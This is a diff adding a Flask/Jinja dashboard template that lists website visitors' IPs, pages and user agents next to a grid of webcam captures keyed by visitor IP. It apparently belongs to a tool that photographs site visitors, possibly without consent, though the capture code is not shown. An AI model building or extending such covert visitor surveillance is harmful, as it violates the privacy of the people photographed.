@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Monitoring Data</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h1>Website Monitoring Data</h1>
+        
+        <h2>Page Visits</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>IP Address</th>
+                    <th>Page</th>
+                    <th>User Agent</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for visitor in visitors %}
+                <tr>
+                    <td>{{ visitor.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td>
+                    <td>{{ visitor.ip_address }}</td>
+                    <td>{{ visitor.page_url }}</td>
+                    <td>{{ visitor.user_agent }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+
+        <h2>Webcam Captures</h2>
+        <div class="captures-grid">
+            {% for capture in captures %}
+            <div class="capture-item">
+                <img src="{{ capture.image_data }}" alt="Capture">
+                <p>IP: {{ capture.ip_address }}</p>
+                <p>Time: {{ capture.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</p>
+            </div>
+            {% endfor %}
+        </div>
+
+        <div class="button-container">
+            <a href="{{ url_for('index') }}" class="button">Back to Home</a>
+        </div>
+    </div>
+
+    <script>
+        // Record page visit
+        fetch(`/record_visit?page=${window.location.pathname}`);
+    </script>
+</body>
+</html>
